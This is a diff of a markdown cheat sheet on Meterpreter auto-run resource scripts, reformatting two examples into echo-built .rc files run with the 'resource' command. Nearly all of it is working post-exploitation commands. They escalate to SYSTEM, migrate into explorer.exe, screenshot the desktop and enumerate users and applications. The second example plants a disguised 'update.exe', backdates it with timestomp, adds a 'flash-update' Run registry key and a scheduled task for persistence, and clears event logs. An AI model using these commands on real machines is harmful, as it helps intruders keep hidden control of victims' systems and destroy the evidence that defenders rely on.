@@ -98,24 +98,32 @@
 - **FFF**
 <blockquote>Auto-run scripts are great when you need multiple modules to run automatically</blockquote>
 
-      echo 'getsystem' > my_resource_file.rc
-      echo 'screenshot -v -p IClass.jpeg -v true' >> my_resource_file.rc
-      echo 'run post/windows/manage/migrate' >> my_resource_file.rc
-      echo 'run post/windows/gather/enum_logged_on_users' >> my_resource_file.rc
-      echo 'run post/windows/gather/enum_applications' >> my_resource_file.rc
+      touch my_resource_file.rc
+
+        echo 'getsystem' > my_resource_file.rc
+        echo 'screenshot -v -p IClass.jpeg -v true' >> my_resource_file.rc
+        echo 'run post/windows/manage/migrate' >> my_resource_file.rc
+        echo 'run post/windows/gather/enum_logged_on_users' >> my_resource_file.rc
+        echo 'run post/windows/gather/enum_applications' >> my_resource_file.rc
+
+    `[run]` meterpreter > resource /root/my_resource_file.rc
 
 <br />
 
 - **FFF**
 <blockquote>Auto-run scripts are great when you need to persiste fast your payload automatically</blockquote>
 
-      getsystem
-      run migrate -n explorer.exe
-      upload update.exe %temp%\\update.exe
-      timestomp -z '3/10/1999 15:15:15' %temp%\\update.exe
-      reg setval -k HKLM\\Software\\Microsoft\\Windows\\Currentversion\\Run -v flash-update -d %temp%\\update.exe
-      run scheduleme -m 10 -c "%temp%\\update.exe"
+      touch my_resource_file.rc
+
+      echo 'getsystem' > my_resource_file.rc
+      echo 'run migrate -n explorer.exe' >> my_resource_file.rc
+      echo 'upload update.exe %temp%\\update.exe' >> my_resource_file.rc
+      echo "timestomp -z '3/10/1999 15:15:15' %temp%\\update.exe" >> my_resource_file.rc
+      echo 'reg setval -k HKLM\\Software\\Microsoft\\Windows\\Currentversion\\Run -v flash-update -d %temp%\\update.exe' >> my_resource_file.rc
+      echo 'run scheduleme -m 10 -c "%temp%\\update.exe"' >> my_resource_file.rc
       clearev
+
+    `[run]` meterpreter > resource /root/my_resource_file.rc
 
 <br />
 
